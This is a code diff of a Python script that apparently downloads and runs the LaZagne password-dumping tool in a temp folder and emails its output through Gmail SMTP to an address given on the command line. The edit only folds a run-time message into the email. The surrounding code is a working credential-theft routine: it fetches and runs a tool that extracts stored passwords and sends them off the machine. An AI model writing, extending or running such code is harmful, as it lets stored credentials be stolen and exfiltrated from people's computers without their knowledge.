@@ -34,12 +34,12 @@ def get_arguments():
   
   return options
 
-def send_Mail(from_email, password, to_email, msg):
+def send_Mail(from_email, password, to_email, msg, start_time):
   try:
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     server.login(from_email, password)
-    msg = "Subject: LaZagne output\n\n{}".format(msg)
+    msg = "Subject: LaZagne output\n\n{}\n[=] Process completed in {} seconds".format(msg, time.time()-start_time)
     server.sendmail(from_email, to_email, msg)
     server.quit()
   except Exception as error:
@@ -89,7 +89,6 @@ try:
   tempFile_directory = tempfile.gettempdir()
   os.chdir(tempFile_directory)
   result = download_and_report("https://github.com/AlessandroZ/LaZagne/archive/refs/tags/2.4.3.zip")
-  send_Mail(arguments.From, arguments.password, arguments.to,  result)
-  print(f"[=] Process completed in {time.time()-start} seconds")
+  send_Mail(arguments.From, arguments.password, arguments.to,  result, start)
 except KeyboardInterrupt as error:
   print("\r[-] Quitting the program")
